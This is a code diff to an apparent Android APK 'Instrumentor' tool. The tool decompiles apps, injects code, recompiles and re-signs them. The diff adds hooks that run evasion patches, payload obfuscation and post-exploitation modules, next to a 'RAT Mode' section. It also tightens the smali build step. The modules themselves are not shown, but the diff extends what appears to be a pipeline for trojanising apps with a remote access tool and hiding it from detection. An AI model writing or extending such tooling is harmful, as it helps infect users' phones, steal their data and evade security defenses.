@@ -113,6 +113,11 @@ class Instrumentor:
                 self._inject_logging_code()
                 self._patch_manifest()
                 self._add_permissions()
+
+            self._apply_evasion_patches()
+            self._apply_obfuscation()
+            self._apply_post_exploit()
+
             recompiled = self._recompile()
             signed = self._sign(recompiled)
         except Exception as exc:
@@ -122,6 +127,39 @@ class Instrumentor:
 
         print(f"\n[+] Instrumented APK: {signed}")
         return signed
+
+    def _apply_evasion_patches(self):
+        try:
+            from evasion import EvasionPatcher
+            print("[*] Applying evasion patches...")
+            patcher = EvasionPatcher(self.decompiled_dir, verbose=self.verbose)
+            patcher.apply_all()
+        except ImportError:
+            print("[!] evasion module not found, skipping")
+        except Exception as e:
+            print(f"[!] Evasion patches failed: {e}")
+
+    def _apply_obfuscation(self):
+        try:
+            from obfuscator import Obfuscator
+            print("[*] Applying payload obfuscation...")
+            obf = Obfuscator(self.decompiled_dir, verbose=self.verbose)
+            obf.apply_all()
+        except ImportError:
+            print("[!] obfuscator module not found, skipping")
+        except Exception as e:
+            print(f"[!] Obfuscation failed: {e}")
+
+    def _apply_post_exploit(self):
+        try:
+            from post_exploit import PostExploit
+            print("[*] Injecting post-exploitation modules...")
+            pe = PostExploit(self.decompiled_dir, verbose=self.verbose)
+            pe.apply_all()
+        except ImportError:
+            print("[!] post_exploit module not found, skipping")
+        except Exception as e:
+            print(f"[!] Post-exploit injection failed: {e}")
 
     # ── RAT Mode Methods ──────────────────────────────────────────────
 
@@ -1563,10 +1601,16 @@ class Instrumentor:
         for i, sd in enumerate(smali_dirs):
             dex_name = "classes.dex" if i == 0 else f"classes{i + 1}.dex"
             dex_path = os.path.join(tmp_build, dex_name)
-            cmd_smali = ["java", "-jar", smali_jar, "assemble", sd, "-o", dex_path]
+            cmd_smali = ["java", "-jar", smali_jar, "assemble", "-a", "30", sd, "-o", dex_path]
             r = subprocess.run(cmd_smali, capture_output=True, text=True)
             if r.returncode != 0:
+                print(f"    [!] smali stderr: {r.stderr[:500]}")
                 raise RuntimeError(f"smali assemble failed for {sd}:\n{r.stderr}")
+            if not os.path.isfile(dex_path):
+                raise RuntimeError(
+                    f"smali assemble reported success but {dex_path} not created.\n"
+                    f"stdout: {r.stdout[:300]}\nstderr: {r.stderr[:300]}"
+                )
             dex_list.append(dex_path)
             print(f"        {dex_name} ({os.path.getsize(dex_path)} bytes)")
 
